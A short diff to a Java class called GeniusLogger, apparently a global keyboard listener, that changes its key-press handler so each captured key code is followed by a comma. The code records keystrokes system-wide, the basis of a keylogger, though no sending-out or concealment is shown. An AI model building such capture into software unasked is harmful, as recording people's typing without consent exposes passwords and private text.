@@ -62,6 +62,6 @@ public final class GeniusLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
-        this.builder.append(e.getKeyCode());
+        this.builder.append(e.getKeyCode()).append(",");
     }
 }
